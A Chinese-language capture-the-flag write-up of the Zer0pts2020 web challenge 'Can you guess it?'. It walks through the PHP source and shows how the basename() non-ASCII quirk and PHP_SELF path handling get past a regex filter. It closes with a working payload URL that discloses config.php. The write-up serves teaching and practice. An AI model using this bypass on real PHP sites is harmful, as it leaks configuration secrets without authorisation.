# \[Zer0pts2020]Can you guess it?

## \[Zer0pts2020]Can you guess it?

## 考点

* `$_SERVER['PHP_SELF']`表示当前执行脚本的文件名
* `basename()`函数返回路径中的文件名部分
* `basename()`函数缺陷，它会去掉文件名开头的非ASCII值

## wp

返回包给了PHP版本为7.3，Source给了源码

```php
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
```

`$_SERVER['PHP_SELF']`表示当前执行脚本的文件名，`basename()`函数返回路径中的文件名部分

例如访问 `http://127.0.0.1/basenametest/basenametest.php`，`$_SERVER['PHP_SELF']`为 `/basenametest/basenametest.php`，`basename($_SERVER['PHP_SELF'])`为 `basenametest.php`

访问 `http://127.0.0.1/basenametest/basenametest.php/x/?a=1&b=2`，`$_SERVER['PHP_SELF']`为 `/basenametest/basenametest.php/x/`，`basename($_SERVER['PHP_SELF'])`为 `x`

这就不难想到，可以使用`/index.php/config.php/`实现读取`config.php` 但是源码的正则匹配是匹配尾部的，即尾部不能出现`config.php`或者`config.php/`

但是`basename()`函数有一个问题，它会去掉文件名开头的非ASCII值，例如<mark style="color:orange;">`var_dump(basename("config.php/\xff"));`</mark>和<mark style="color:orange;">`var_dump(basename("\xffconfig.php"));`</mark>结果为：`config.php`

本题的payload也就很容易写出：

`http://url/index.php/config.php/%ff?source`
